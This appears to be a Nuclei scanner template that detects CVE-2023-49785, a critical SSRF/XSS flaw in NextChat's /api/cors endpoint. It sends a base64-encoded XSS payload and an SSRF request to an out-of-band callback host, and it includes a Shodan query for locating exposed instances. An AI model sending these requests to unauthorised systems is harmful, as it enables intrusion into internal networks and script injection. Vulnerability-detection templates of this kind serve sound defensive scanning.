http:
- matchers:
  - condition: and
    dsl:
    - contains(body_1, "<script>alert(document.domain)</script>")
    - contains(header_1, "text/html")
    type: dsl
  - condition: and
    dsl:
    - contains(header_2,'X-Interactsh-Version')
    - contains(interactsh_protocol_2,'dns')
    type: dsl
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23'
  - '{{BaseURL}}/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23'
id: CVE-2023-49785
info:
  author: high
  classification:
    cve-id: CVE-2023-49785
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-79
    epss-percentile: 0.99802
    epss-score: 0.93382
  description: 'Full-Read SSRF/XSS in NextChat, aka ChatGPT-Next-Web

    '
  impact: 'Unauthenticated attackers can exploit SSRF vulnerabilities through the
    /api/cors endpoint to access internal network resources and inject malicious JavaScript
    for cross-site scripting attacks.

    '
  metadata:
    max-request: 2
    shodan-query: title:NextChat,"ChatGPT Next Web"
    verified: true
  name: ChatGPT-Next-Web - SSRF/XSS
  reference:
  - https://www.horizon3.ai/attack-research/attack-blogs/nextchat-an-ai-chatbot-that-lets-you-talk-to-anyone-you-want-to/
  - https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web
  remediation: 'Do not expose to the Internet

    '
  severity: critical
  tags: cve,cve2023,ssrf,xss,chatgpt,nextchat,vkev,vuln
